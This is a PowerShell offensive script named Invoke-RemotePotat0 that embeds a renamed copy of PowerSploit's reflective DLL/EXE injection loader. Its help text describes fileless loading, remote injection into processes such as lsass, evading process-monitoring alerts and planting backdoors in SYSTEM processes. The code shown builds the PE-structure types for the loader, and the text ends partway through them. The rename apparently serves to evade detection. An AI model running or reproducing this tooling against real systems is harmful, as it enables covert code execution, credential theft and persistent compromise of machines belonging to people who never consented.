function Invoke-RemotePotat0
{

Param(
        [string]
        $arguments
)


function reflectit
{
<#
.SYNOPSIS

This script has two modes. It can reflectively load a DLL/EXE in to the PowerShell process, 
or it can reflectively load a DLL in to a remote process. These modes have different parameters and constraints, 
please lead the Notes section (GENERAL NOTES) for information on how to use them.

1.)Reflectively loads a DLL or EXE in to memory of the Powershell process.
Because the DLL/EXE is loaded reflectively, it is not displayed when tools are used to list the DLLs of a running process.

This tool can be run on remote servers by supplying a local Windows PE file (DLL/EXE) to load in to memory on the remote system,
this will load and execute the DLL/EXE in to memory without writing any files to disk.

2.) Reflectively load a DLL in to memory of a remote process.
As mentioned above, the DLL being reflectively loaded won't be displayed when tools are used to list DLLs of the running remote process.

This is probably most useful for injecting backdoors in SYSTEM processes in Session0. Currently, you cannot retrieve output
from the DLL. The script doesn't wait for the DLL to complete execution, and doesn't make any effort to cleanup memory in the 
remote process. 

PowerSploit Function: reflectit
Author: Joe Bialek, Twitter: @JosephBialek
Code review and modifications: Matt Graeber, Twitter: @mattifestation
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: None

.DESCRIPTION

Reflectively loads a Windows PE file (DLL/EXE) in to the powershell process, or reflectively injects a DLL in to a remote process.

.PARAMETER PEBytes

A byte array containing a DLL/EXE to load and execute.

.PARAMETER ComputerName

Optional, an array of computernames to run the script on.

.PARAMETER FuncReturnType

Optional, the return type of the function being called in the DLL. Default: Void
	Options: String, WString, Void. See notes for more information.
	IMPORTANT: For DLLs being loaded remotely, only Void is supported.
	
.PARAMETER ExeArgs

Optional, arguments to pass to the executable being reflectively loaded.
	
.PARAMETER ProcName

Optional, the name of the remote process to inject the DLL in to. If not injecting in to remote process, ignore this.

.PARAMETER ProcId

Optional, the process ID of the remote process to inject the DLL in to. If not injecting in to remote process, ignore this.

.PARAMETER ForceASLR

Optional, will force the use of ASLR on the PE being loaded even if the PE indicates it doesn't support ASLR. Some PE's will work with ASLR even
    if the compiler flags don't indicate they support it. Other PE's will simply crash. Make sure to test this prior to using. Has no effect when
    loading in to a remote process.

.PARAMETER DoNotZeroMZ

Optional, will not wipe the MZ from the first two bytes of the PE. This is to be used primarily for testing purposes and to enable loading the same PE with reflectit more than once.
	
.EXAMPLE

Load DemoDLL and run the exported function WStringFunc on Target.local, print the wchar_t* returned by WStringFunc().
$PEBytes = [IO.File]::ReadAllBytes('DemoDLL.dll')
reflectit -PEBytes $PEBytes -FuncReturnType WString -ComputerName Target.local

.EXAMPLE

Load DemoDLL and run the exported function WStringFunc on all computers in the file targetlist.txt. Print
	the wchar_t* returned by WStringFunc() from all the computers.
$PEBytes = [IO.File]::ReadAllBytes('DemoDLL.dll')
reflectit -PEBytes $PEBytes -FuncReturnType WString -ComputerName (Get-Content targetlist.txt)

.EXAMPLE

Load DemoEXE and run it locally.
$PEBytes = [IO.File]::ReadAllBytes('DemoEXE.exe')
reflectit -PEBytes $PEBytes -ExeArgs "Arg1 Arg2 Arg3 Arg4"

.EXAMPLE

Load DemoEXE and run it locally. Forces ASLR on for the EXE.
$PEBytes = [IO.File]::ReadAllBytes('DemoEXE.exe')
reflectit -PEBytes $PEBytes -ExeArgs "Arg1 Arg2 Arg3 Arg4" -ForceASLR

.EXAMPLE

Refectively load DemoDLL_RemoteProcess.dll in to the lsass process on a remote computer.
$PEBytes = [IO.File]::ReadAllBytes('DemoDLL_RemoteProcess.dll')
reflectit -PEBytes $PEBytes -ProcName lsass -ComputerName Target.Local

.NOTES
GENERAL NOTES:
The script has 3 basic sets of functionality:
1.) Reflectively load a DLL in to the PowerShell process
	-Can return DLL output to user when run remotely or locally.
	-Cleans up memory in the PS process once the DLL finishes executing.
	-Great for running pentest tools on remote computers without triggering process monitoring alerts.
	-By default, takes 3 function names, see below (DLL LOADING NOTES) for more info.
2.) Reflectively load an EXE in to the PowerShell process.
	-Can NOT return EXE output to user when run remotely. If remote output is needed, you must use a DLL. CAN return EXE output if run locally.
	-Cleans up memory in the PS process once the DLL finishes executing.
	-Great for running existing pentest tools which are EXE's without triggering process monitoring alerts.
3.) Reflectively inject a DLL in to a remote process.
	-Can NOT return DLL output to the user when run remotely OR locally.
	-Does NOT clean up memory in the remote process if/when DLL finishes execution.
	-Great for planting backdoor on a system by injecting backdoor DLL in to another processes memory.
	-Expects the DLL to have this function: void VoidFunc(). This is the function that will be called after the DLL is loaded.

DLL LOADING NOTES:

PowerShell does not capture an applications output if it is output using stdout, which is how Windows console apps output.
If you need to get back the output from the PE file you are loading on remote computers, you must compile the PE file as a DLL, and have the DLL
return a char* or wchar_t*, which PowerShell can take and read the output from. Anything output from stdout which is run using powershell
remoting will not be returned to you. If you just run the PowerShell script locally, you WILL be able to see the stdout output from
applications because it will just appear in the console window. The limitation only applies when using PowerShell remoting.

For DLL Loading:
Once this script loads the DLL, it calls a function in the DLL. There is a section near the bottom labeled "YOUR CODE GOES HERE"
I recommend your DLL take no parameters. I have prewritten code to handle functions which take no parameters are return
the following types: char*, wchar_t*, and void. If the function returns char* or wchar_t* the script will output the
returned data. The FuncReturnType parameter can be used to specify which return type to use. The mapping is as follows:
wchar_t*   : FuncReturnType = WString
char*      : FuncReturnType = String
void       : Default, don't supply a FuncReturnType

For the whcar_t* and char_t* options to work, you must allocate the string to the heap. Don't simply convert a string
using string.c_str() because it will be allocaed on the stack and be destroyed when the DLL returns.

The function name expected in the DLL for the prewritten FuncReturnType's is as follows:
WString    : WStringFunc
String     : StringFunc
Void       : VoidFunc

These function names ARE case sensitive. To create an exported DLL function for the wstring type, the function would
be declared as follows:
extern "C" __declspec( dllexport ) wchar_t* WStringFunc()


If you want to use a DLL which returns a different data type, or which takes parameters, you will need to modify
this script to accomodate this. You can find the code to modify in the section labeled "YOUR CODE GOES HERE".

Find a DemoDLL at: https://github.com/clymb3r/PowerShell/tree/master/Invoke-ReflectiveDllInjection

.LINK

http://clymb3r.wordpress.com/2013/04/06/reflective-dll-injection-with-powershell/

Blog on modifying mimikatz for reflective loading: http://clymb3r.wordpress.com/2013/04/09/modifying-mimikatz-to-be-loaded-using-invoke-reflectivedllinjection-ps1/
Blog on using this script as a backdoor with SQL server: http://www.casaba.com/blog/
#>

[CmdletBinding()]
Param(
    [Parameter(Position = 0, Mandatory = $true)]
    [ValidateNotNullOrEmpty()]
    [Byte[]]
    $PEBytes,
	
	[Parameter(Position = 1)]
	[String[]]
	$ComputerName,
	
	[Parameter(Position = 2)]
    [ValidateSet( 'WString', 'String', 'Void' )]
	[String]
	$FuncReturnType = 'Void',
	
	[Parameter(Position = 3)]
	[String]
	$ExeArgs,
	
	[Parameter(Position = 4)]
	[Int32]
	$ProcId,
	
	[Parameter(Position = 5)]
	[String]
	$ProcName,

    [Switch]
    $ForceASLR,

	[Switch]
	$DoNotZeroMZ
)

Set-StrictMode -Version 2


$RemoteScriptBlock = {
	[CmdletBinding()]
	Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Byte[]]
		$PEBytes,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[String]
		$FuncReturnType,
				
		[Parameter(Position = 2, Mandatory = $true)]
		[Int32]
		$ProcId,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[String]
		$ProcName,

        [Parameter(Position = 4, Mandatory = $true)]
        [Bool]
        $ForceASLR
	)
	
	###################################
	##########  Win32 Stuff  ##########
	###################################
	Function Get-Win32Types
	{
		$Win32Types = New-Object System.Object

		#Define all the structures/enums that will be used
		#	This article shows you how to do this with reflection: http://www.exploit-monday.com/2012/07/structs-and-enums-using-reflection.html
		$Domain = [AppDomain]::CurrentDomain
		$DynamicAssembly = New-Object System.Reflection.AssemblyName('DynamicAssembly')
		$AssemblyBuilder = $Domain.DefineDynamicAssembly($DynamicAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
		$ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('DynamicModule', $false)
		$ConstructorInfo = [System.Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]


		############    ENUM    ############
		#Enum MachineType
		$TypeBuilder = $ModuleBuilder.DefineEnum('MachineType', 'Public', [UInt16])
		$TypeBuilder.DefineLiteral('Native', [UInt16] 0) | Out-Null
		$TypeBuilder.DefineLiteral('I386', [UInt16] 0x014c) | Out-Null
		$TypeBuilder.DefineLiteral('Itanium', [UInt16] 0x0200) | Out-Null
		$TypeBuilder.DefineLiteral('x64', [UInt16] 0x8664) | Out-Null
		$MachineType = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name MachineType -Value $MachineType

		#Enum MagicType
		$TypeBuilder = $ModuleBuilder.DefineEnum('MagicType', 'Public', [UInt16])
		$TypeBuilder.DefineLiteral('IMAGE_NT_OPTIONAL_HDR32_MAGIC', [UInt16] 0x10b) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_NT_OPTIONAL_HDR64_MAGIC', [UInt16] 0x20b) | Out-Null
		$MagicType = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name MagicType -Value $MagicType

		#Enum SubSystemType
		$TypeBuilder = $ModuleBuilder.DefineEnum('SubSystemType', 'Public', [UInt16])
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_UNKNOWN', [UInt16] 0) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_NATIVE', [UInt16] 1) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_GUI', [UInt16] 2) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CUI', [UInt16] 3) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_POSIX_CUI', [UInt16] 7) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CE_GUI', [UInt16] 9) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_APPLICATION', [UInt16] 10) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_BOOT_SERVICE_DRIVER', [UInt16] 11) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_RUNTIME_DRIVER', [UInt16] 12) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_ROM', [UInt16] 13) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_XBOX', [UInt16] 14) | Out-Null
		$SubSystemType = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name SubSystemType -Value $SubSystemType

		#Enum DllCharacteristicsType
		$TypeBuilder = $ModuleBuilder.DefineEnum('DllCharacteristicsType', 'Public', [UInt16])
		$TypeBuilder.DefineLiteral('RES_0', [UInt16] 0x0001) | Out-Null
		$TypeBuilder.DefineLiteral('RES_1', [UInt16] 0x0002) | Out-Null
		$TypeBuilder.DefineLiteral('RES_2', [UInt16] 0x0004) | Out-Null
		$TypeBuilder.DefineLiteral('RES_3', [UInt16] 0x0008) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE', [UInt16] 0x0040) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_FORCE_INTEGRITY', [UInt16] 0x0080) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_NX_COMPAT', [UInt16] 0x0100) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_ISOLATION', [UInt16] 0x0200) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_SEH', [UInt16] 0x0400) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_BIND', [UInt16] 0x0800) | Out-Null
		$TypeBuilder.DefineLiteral('RES_4', [UInt16] 0x1000) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_WDM_DRIVER', [UInt16] 0x2000) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_TERMINAL_SERVER_AWARE', [UInt16] 0x8000) | Out-Null
		$DllCharacteristicsType = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name DllCharacteristicsType -Value $DllCharacteristicsType

		###########    STRUCT    ###########
		#Struct IMAGE_DATA_DIRECTORY
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_DATA_DIRECTORY', $Attributes, [System.ValueType], 8)
		($TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public')).SetOffset(0) | Out-Null
		($TypeBuilder.DefineField('Size', [UInt32], 'Public')).SetOffset(4) | Out-Null
		$IMAGE_DATA_DIRECTORY = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DATA_DIRECTORY -Value $IMAGE_DATA_DIRECTORY

		#Struct IMAGE_FILE_HEADER
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_FILE_HEADER', $Attributes, [System.ValueType], 20)
		$TypeBuilder.DefineField('Machine', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfSections', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('PointerToSymbolTable', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfSymbols', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('SizeOfOptionalHeader', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('Characteristics', [UInt16], 'Public') | Out-Null
		$IMAGE_FILE_HEADER = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_HEADER -Value $IMAGE_FILE_HEADER

		#Struct IMAGE_OPTIONAL_HEADER64
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_OPTIONAL_HEADER64', $Attributes, [System.ValueType], 240)
		($TypeBuilder.DefineField('Magic', $MagicType, 'Public')).SetOffset(0) | Out-Null
		($TypeBuilder.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
		($TypeBuilder.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
		($TypeBuilder.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
		($TypeBuilder.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
		($TypeBuilder.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
		($TypeBuilder.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
		($TypeBuilder.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
		($TypeBuilder.DefineField('ImageBase', [UInt64], 'Public')).SetOffset(24) | Out-Null
		($TypeBuilder.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
		($TypeBuilder.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
		($TypeBuilder.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
		($TypeBuilder.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
		($TypeBuilder.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
		($TypeBuilder.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
		($TypeBuilder.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
		($TypeBuilder.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
		($TypeBuilder.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
		($TypeBuilder.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
		($TypeBuilder.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
		($TypeBuilder.DefineField('Subsystem', $SubSystemType, 'Public')).SetOffset(68) | Out-Null
		($TypeBuilder.DefineField('DllCharacteristics', $DllCharacteristicsType, 'Public')).SetOffset(70) | Out-Null
		($TypeBuilder.DefineField('SizeOfStackReserve', [UInt64], 'Public')).SetOffset(72) | Out-Null
		($TypeBuilder.DefineField('SizeOfStackCommit', [UInt64], 'Public')).SetOffset(80) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeapReserve', [UInt64], 'Public')).SetOffset(88) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeapCommit', [UInt64], 'Public')).SetOffset(96) | Out-Null
		($TypeBuilder.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(104) | Out-Null
		($TypeBuilder.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(108) | Out-Null
		($TypeBuilder.DefineField('ExportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(112) | Out-Null
		($TypeBuilder.DefineField('ImportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(120) | Out-Null
		($TypeBuilder.DefineField('ResourceTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(128) | Out-Null
		($TypeBuilder.DefineField('ExceptionTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(136) | Out-Null
		($TypeBuilder.DefineField('CertificateTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(144) | Out-Null
		($TypeBuilder.DefineField('BaseRelocationTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(152) | Out-Null
		($TypeBuilder.DefineField('Debug', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(160) | Out-Null
		($TypeBuilder.DefineField('Architecture', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(168) | Out-Null
		($TypeBuilder.DefineField('GlobalPtr', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(176) | Out-Null
		($TypeBuilder.DefineField('TLSTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(184) | Out-Null
		($TypeBuilder.DefineField('LoadConfigTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(192) | Out-Null
		($TypeBuilder.DefineField('BoundImport', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(200) | Out-Null
		($TypeBuilder.DefineField('IAT', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(208) | Out-Null
		($TypeBuilder.DefineField('DelayImportDescriptor', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(216) | Out-Null
		($TypeBuilder.DefineField('CLRRuntimeHeader', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(224) | Out-Null
		($TypeBuilder.DefineField('Reserved', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(232) | Out-Null
		$IMAGE_OPTIONAL_HEADER64 = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER64 -Value $IMAGE_OPTIONAL_HEADER64

		#Struct IMAGE_OPTIONAL_HEADER32
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_OPTIONAL_HEADER32', $Attributes, [System.ValueType], 224)
		($TypeBuilder.DefineField('Magic', $MagicType, 'Public')).SetOffset(0) | Out-Null
		($TypeBuilder.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
		($TypeBuilder.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
		($TypeBuilder.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
		($TypeBuilder.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
		($TypeBuilder.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
		($TypeBuilder.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
		($TypeBuilder.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
		($TypeBuilder.DefineField('BaseOfData', [UInt32], 'Public')).SetOffset(24) | Out-Null
		($TypeBuilder.DefineField('ImageBase', [UInt32], 'Public')).SetOffset(28) | Out-Null
		($TypeBuilder.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
		($TypeBuilder.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
		($TypeBuilder.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
		($TypeBuilder.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
		($TypeBuilder.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
		($TypeBuilder.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
		($TypeBuilder.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
		($TypeBuilder.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
		($TypeBuilder.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
		($TypeBuilder.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
		($TypeBuilder.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
		($TypeBuilder.DefineField('Subsystem', $SubSystemType, 'Public')).SetOffset(68) | Out-Null
		($TypeBuilder.DefineField('DllCharacteristics', $DllCharacteristicsType, 'Public')).SetOffset(70) | Out-Null
		($TypeBuilder.DefineField('SizeOfStackReserve', [UInt32], 'Public')).SetOffset(72) | Out-Null
		($TypeBuilder.DefineField('SizeOfStackCommit', [UInt32], 'Public')).SetOffset(76) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeapReserve', [UInt32], 'Public')).SetOffset(80) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeapCommit', [UInt32], 'Public')).SetOffset(84) | Out-Null
		($TypeBuilder.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(88) | Out-Null
		($TypeBuilder.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(92) | Out-Null
		($TypeBuilder.DefineField('ExportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(96) | Out-Null
		($TypeBuilder.DefineField('ImportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(104) | Out-Null
		($TypeBuilder.DefineField('ResourceTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(112) | Out-Null
		($TypeBuilder.DefineField('ExceptionTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(120) | Out-Null
		($TypeBuilder.DefineField('CertificateTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(128) | Out-Null
		($TypeBuilder.DefineField('BaseRelocationTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(136) | Out-Null
		($TypeBuilder.DefineField('Debug', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(144) | Out-Null
		($TypeBuilder.DefineField('Architecture', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(152) | Out-Null
		($TypeBuilder.DefineField('GlobalPtr', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(160) | Out-Null
		($TypeBuilder.DefineField('TLSTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(168) | Out-Null
		($TypeBuilder.DefineField('LoadConfigTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(176) | Out-Null
		($TypeBuilder.DefineField('BoundImport', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(184) | Out-Null
		($TypeBuilder.DefineField('IAT', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(192) | Out-Null
		($TypeBuilder.DefineField('DelayImportDescriptor', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(200) | Out-Null
		($TypeBuilder.DefineField('CLRRuntimeHeader', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(208) | Out-Null
		($TypeBuilder.DefineField('Reserved', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(216) | Out-Null
		$IMAGE_OPTIONAL_HEADER32 = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER32 -Value $IMAGE_OPTIONAL_HEADER32

		#Struct IMAGE_NT_HEADERS64
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_NT_HEADERS64', $Attributes, [System.ValueType], 264)
		$TypeBuilder.DefineField('Signature', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('FileHeader', $IMAGE_FILE_HEADER, 'Public') | Out-Null
		$TypeBuilder.DefineField('OptionalHeader', $IMAGE_OPTIONAL_HEADER64, 'Public') | Out-Null
		$IMAGE_NT_HEADERS64 = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS64 -Value $IMAGE_NT_HEADERS64
		
		#Struct IMAGE_NT_HEADERS32
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_NT_HEADERS32', $Attributes, [System.ValueType], 248)
		$TypeBuilder.DefineField('Signature', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('FileHeader', $IMAGE_FILE_HEADER, 'Public') | Out-Null
		$TypeBuilder.DefineField('OptionalHeader', $IMAGE_OPTIONAL_HEADER32, 'Public') | Out-Null
		$IMAGE_NT_HEADERS32 = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS32 -Value $IMAGE_NT_HEADERS32

		#Struct IMAGE_DOS_HEADER
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_DOS_HEADER', $Attributes, [System.ValueType], 64)
		$TypeBuilder.DefineField('e_magic', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_cblp', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_cp', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_crlc', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_cparhdr', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_minalloc', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_maxalloc', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_ss', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_sp', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_csum', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_ip', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_cs', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_lfarlc', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_ovno', [UInt16], 'Public') | Out-Null

		$e_resField = $TypeBuilder.DefineField('e_res', [UInt16[]], 'Public, HasFieldMarshal')
		$ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		$FieldArray = @([System.Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))
		$AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 4))
		$e_resField.SetCustomAttribute($AttribBuilder)

		$TypeBuilder.DefineField('e_oemid', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_oeminfo', [UInt16], 'Public') | Out-Null

		$e_res2Field = $TypeBuilder.DefineField('e_res2', [UInt16[]], 'Public, HasFieldMarshal')
		$ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		$AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 10))
		$e_res2Field.SetCustomAttribute($AttribBuilder)

		$TypeBuilder.DefineField('e_lfanew', [Int32], 'Public') | Out-Null
		$IMAGE_DOS_HEADER = $TypeBuilder.CreateType()	
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DOS_HEADER -Value $IMAGE_DOS_HEADER

		#Struct IMAGE_SECTION_HEADER
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_SECTION_HEADER', $Attributes, [System.ValueType], 40)

		$nameField = $TypeBuilder.DefineField('Name', [Char[]], 'Public, HasFieldMarshal')
		$ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
